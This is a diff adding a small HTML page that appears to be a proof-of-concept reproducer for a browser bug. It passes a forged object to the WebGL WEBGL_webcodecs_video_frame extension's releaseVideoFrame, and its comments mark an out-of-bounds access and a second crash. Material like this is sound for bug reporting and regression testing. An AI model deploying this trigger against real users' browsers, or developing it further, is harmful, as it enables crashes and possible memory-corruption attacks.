@@ -1,0 +1,20 @@
+<html>
+    <canvas id="canvas">
+    </canvas>
+    
+    <script>
+        alert(1);
+        let canvas = new OffscreenCanvas(800, 600);
+        let gl = canvas.getContext("webgl2");
+        let ext = gl.getExtension("WEBGL_webcodecs_video_frame");
+
+        var fake = {};
+       // fake.textureInfoArray = []; //crash 1, oob access
+
+        fake.textureInfoArray = [
+            {texture:gl.createTexture()}, //index 0, crash2
+        ];
+        
+        ext.releaseVideoFrame(fake);
+    </script>
+</html>
